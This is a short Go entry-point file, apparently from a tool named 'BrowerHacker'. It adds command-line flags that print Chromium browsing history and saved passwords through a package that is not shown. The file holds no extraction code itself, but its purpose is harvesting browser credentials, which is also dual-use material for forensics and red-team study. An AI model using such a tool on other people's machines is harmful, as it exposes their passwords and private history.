package main

import (
	"BrowerHacker/exec"
	"flag"
	"fmt"
)
var history bool
var password bool


func init(){
	flag.BoolVar(&history,"history",false,"print chromium history")
	flag.BoolVar(&password,"password",false,"print chromium password")
	flag.Parse()
}
func main(){
	err := exec.ChromiumExecData(password,history)
	if err != nil {
		fmt.Println(err)
	}
}


